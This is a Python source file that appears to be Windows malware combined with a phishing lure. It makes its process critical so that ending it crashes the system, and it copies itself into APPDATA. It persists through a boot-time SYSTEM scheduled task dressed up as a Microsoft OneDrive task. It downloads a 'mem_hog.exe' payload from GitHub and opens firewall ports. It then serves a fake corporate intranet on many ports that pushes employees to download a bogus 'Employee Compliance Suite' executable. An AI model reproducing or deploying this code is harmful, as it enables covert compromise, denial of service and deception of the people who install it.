import os
import sys
import ctypes
import subprocess
import requests
import urllib3
import random
import string
import threading
import psutil, shutil
from http.server import HTTPServer, BaseHTTPRequestHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RtlSetProcessIsCritical = ctypes.windll.ntdll.RtlSetProcessIsCritical
RtlSetProcessIsCritical.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_uint]
RtlSetProcessIsCritical.restype = ctypes.c_int

GITHUB_URL = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/mem_hog.exe"
PAYLOAD_PATH = None

def set_process_as_critical():
    try:
        result = RtlSetProcessIsCritical(1, 0, 0)
        
        if result == 0:
            print("Process is now critical.")
        else:
            print("Failed to set the process as critical.")
    
    except Exception as e:
        print(f"Error: {e}")

def generate_random_name(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def download_payload():
    global PAYLOAD_PATH
    try:
        random_name = f'{generate_random_name()}.exe'
        destination_path = os.path.join(os.getenv('TEMP'), random_name)
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            with open(destination_path, 'wb') as f:
                f.write(response.content)
            PAYLOAD_PATH = destination_path
        return destination_path
    except:
        return None

# HTTP server to serve init.exe and multi-page intranet portal
class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global PAYLOAD_PATH
        # Common nav bar for all pages
        nav_bar = """
        <nav class="bg-blue-600 text-white py-4">
            <div class="container mx-auto px-4 flex justify-between items-center">
                <h1 class="text-xl font-bold">Corporate Intranet</h1>
                <div class="space-x-4">
                    <a href="/" class="hover:text-gray-200 {}">Home</a>
                    <a href="/alerts" class="hover:text-gray-200 {}">Security Alerts</a>
                    <a href="/training" class="hover:text-gray-200 {}">Training</a>
                    <a href="/files" class="hover:text-gray-200 {}">Files</a>
                    <a href="/support" class="hover:text-gray-200 {}">Support</a>
                    <a href="/about" class="hover:text-gray-200 {}">About</a>
                </div>
            </div>
        </nav>
        """.format(
            "font-semibold" if self.path == "/" else "",
            "font-semibold" if self.path == "/alerts" else "",
            "font-semibold" if self.path == "/training" else "",
            "font-semibold" if self.path == "/files" else "",
            "font-semibold" if self.path == "/support" else "",
            "font-semibold" if self.path == "/about" else ""
        )

        if self.path == '/update.exe':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            if PAYLOAD_PATH and os.path.exists(PAYLOAD_PATH): payload_path = PAYLOAD_PATH
            else: payload_path = download_payload()
            if not payload_path or not os.path.exists(payload_path):
                payload_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            with open(payload_path, 'rb') as f:
                self.wfile.write(f.read())
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Corporate Intranet - Employee Compliance Suite</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <!-- Hero Section -->
                    <section class="py-12 text-center">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">2025 Employee Compliance Suite</h2>
                            <p class="text-lg text-gray-600 mb-6">Install the mandatory Employee Compliance Suite by July 15, 2025, to generate your Network Access Token and comply with HR cybersecurity policies.</p>
                            <div class="w-1/2 mx-auto bg-gray-200 rounded-full h-2.5 mb-6">
                                <div class="bg-blue-600 h-2.5 rounded-full" style="width: 90%"></div>
                            </div>
                            <a href="/update.exe" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Download Compliance Suite</a>
                        </div>
                    </section>
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/alerts':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Security Alerts - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Security Alerts</h2>
                            <h3 class="text-xl font-semibold text-gray-700 mb-2">CVE-2024-30051: Windows DWM Core Library Vulnerability</h3>
                            <p class="text-lg text-gray-600 mb-4">A heap-based buffer overflow in the Windows Desktop Window Manager (DWM) Core Library (CVSS 7.8) allows local attackers to escalate privileges to SYSTEM level. Discovered in early 2024, this vulnerability requires user interaction, such as running a malicious file. Microsoft released a patch in May 2024.</p>
                            <p class="text-lg text-gray-600 mb-4">Unpatched systems are vulnerable to malware infections, data breaches, and unauthorized access. Ensure your system is compliant with the latest HR cybersecurity policies.</p>
                        </div>
                    </section>
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/training':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>Training Resources - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Cybersecurity Training Resources</h2>
                            <p class="text-lg text-gray-600 mb-4">Our 2025 Phishing Awareness and GDPR Compliance training modules are mandatory for all employees. Complete by July 15, 2025, to meet HR requirements.</p>
                            <p class="text-lg text-gray-600 mb-4">The Employee Compliance Suite includes access to these modules and generates your Network Access Token.</p>
                            <a href="/" class="inline-block bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg hover:bg-blue-700 transition">Access Training Modules</a>
                        </div>
                    </section>
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/support':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>IT Support - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">IT Support</h2>
                            <p class="text-lg text-gray-600 mb-4">Contact our IT team at support@corporateintranet.com or call (555) 012-3456 for assistance with 2025 compliance policies.</p>
                            <p class="text-lg text-gray-600 mb-4">Our team ensures all systems meet HR cybersecurity requirements, including the mandatory Employee Compliance Suite installation.</p>
                        </div>
                    </section>
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/files':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>File Share - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12 text-center">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">Corporate File Share</h2>
                            <p class="text-lg text-gray-600 mb-4">Access shared resources after installing the Employee Compliance Suite.</p>
                        </div>
                    </section>
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/about':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
                <head>
                    <title>About Us - Corporate Intranet</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
                </head>
                <body class="bg-gray-100 font-sans">
                    {nav_bar}
                    <section class="py-12">
                        <div class="container mx-auto px-4">
                            <h2 class="text-3xl font-semibold text-gray-800 mb-4">About Our IT Team</h2>
                            <p class="text-lg text-gray-600 mb-4">Led by John Smith (Cybersecurity Lead) and Jane Doe (Compliance Officer), our IT team has over 20 years of experience ensuring network security.</p>
                            <p class="text-lg text-gray-600 mb-4">We collaborate with HR to enforce 2025 cybersecurity policies, protecting our corporate network from emerging threats.</p>
                        </div>
                    </section>
                    <footer class="bg-gray-800 text-white py-4">
                        <div class="container mx-auto px-4 text-center">
                            <p>© 2025 Corporate Intranet. All rights reserved.</p>
                        </div>
                    </footer>
                </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))

def start_http_server_on_port(port):
    try:
        subprocess.run(
        f'netsh advfirewall firewall add rule name="Allow_HTTP_{port}" dir=in action=allow protocol=TCP localport={port}',
        shell=True, capture_output=True, text=True, creationflags=0x08000000)
        server = HTTPServer(('0.0.0.0', port), HTTPHandler)
        server.serve_forever()
    except:
        # print(f"Error: {e}")
        pass

# Start HTTP server and open firewall
def start_http_servers():
    threads = []
    for port in [80, 8000, 8080, 8081, 8082, 8083, 8888, 4444, 5500, 443, 5000, 5001, 3000, 7000, 9000]:
        thread = threading.Thread(target=start_http_server_on_port, args=(port,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

# Hide process by mimicking powershell.exe
def hide_process():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'powershell.exe':
                os.environ['COMSPEC'] = proc.exe()
                break
    except:
        # print(f"Error in hide_process: {e}")
        pass

# Persistence via schtasks
def persist_schtasks():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        appdata_path = os.path.join(os.getenv('APPDATA'), 'RuntimeBrokerHelper.exe') # this will be the PE file name
        if exe_path != appdata_path:
            shutil.copy2(exe_path, appdata_path)
        exe_path = f'"{os.path.normpath(appdata_path)}"'
        task_name = "OneDrive Startup Task-S-1-5-18-18081254745-36735435435255-3934re6s4246829952-16001"
        xml = rf"""
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <RegistrationInfo>
        <Author>Microsoft Corporation</Author>
        <Description>OneDrive Runtime Handler</Description>
        <URI>\Microsoft\Windows\Defender\HealthMonitor</URI>
        <Date>2024-01-01T00:00:00</Date>
    </RegistrationInfo>
    <Principals>
        <Principal id="Author">
            <UserId>NT AUTHORITY\SYSTEM</UserId>
            <RunLevel>HighestAvailable</RunLevel>
        </Principal>
    </Principals>
    <Triggers>
        <BootTrigger>
            <Enabled>true</Enabled>
            <Delay>PT30S</Delay>
        </BootTrigger>
    </Triggers>
    <Settings>
        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> 
    </Settings>
    <Actions Context="Author">
        <Exec>
            <Command>{exe_path}</Command>
        </Exec>
    </Actions>
</Task>
"""
        xml_path = os.path.join(os.getenv('TEMP'), 'gg.xml')
        open(xml_path, 'w', encoding='utf-16').write(xml.strip())
        cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
        subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
        os.system(f'powershell remove-item -path "{xml_path}" -force -erroraction silentlycontinue')
    except:
        # print(f"Error in persist_schtasks: {e}")
        pass

# Main execution
if __name__ == '__main__':
    set_process_as_critical()
    persist_schtasks()
    hide_process()
    download_payload()
    start_http_servers()